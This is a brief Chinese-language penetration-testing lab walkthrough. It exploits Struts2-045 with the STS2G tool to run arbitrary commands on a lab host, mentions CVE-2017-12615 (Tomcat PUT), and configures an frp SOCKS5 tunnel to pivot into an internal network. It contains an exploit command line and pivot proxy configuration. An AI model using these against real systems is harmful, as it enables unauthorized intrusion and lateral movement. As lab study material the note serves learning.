漏洞扫描

struts2 扫描漏洞

go语言编译的工具需要 go biuld 命令生成出来（报错dial tcp 142.251.42.241:443: connect: connection refused）

需要更换一个国内能访问到的代理地址：执行命令

go env -w GOPROXY=https://goproxy.cn

发现了Struts2-045漏洞

STS2G

./STS2G -url http://192.168.157.128:2001/--mode exec --vn 45 --cmd "ls -al /"

并且可以通过漏洞执行任意命令

发现了.dockerenv文件，初步判断这个是在docker容器中执行的。

CVE-2017-12615

http://192.168.157.128:2002/

因为这个版本开启了PUT协议，并且没有对应的做好过滤

Frp正向代理

通过正向代理连接内网服务

想要进行攻击不同网段的情况下，需要建立一个正向代理

流量走代理隧道进行流量攻击

开启的所有代理都依赖socks_proxy插件

[socks_proxy]

type = tcp

remote_port = 8989

plugin = socks5

客户端是在内网，进行与客户端连接

将客户端的frpc文件和配置文件frpc.ini上传过去，并且再修改配置文件中的内容

需要将IP修改为服务端（Kali）

root@ubuntu:~# cat frpc.ini

[common]

server_addr = 192.168.157.129

server_port = 7000

[socks_proxy]

type = tcp

remote_port = 8989

plugin = socks5

隧道搭建成功
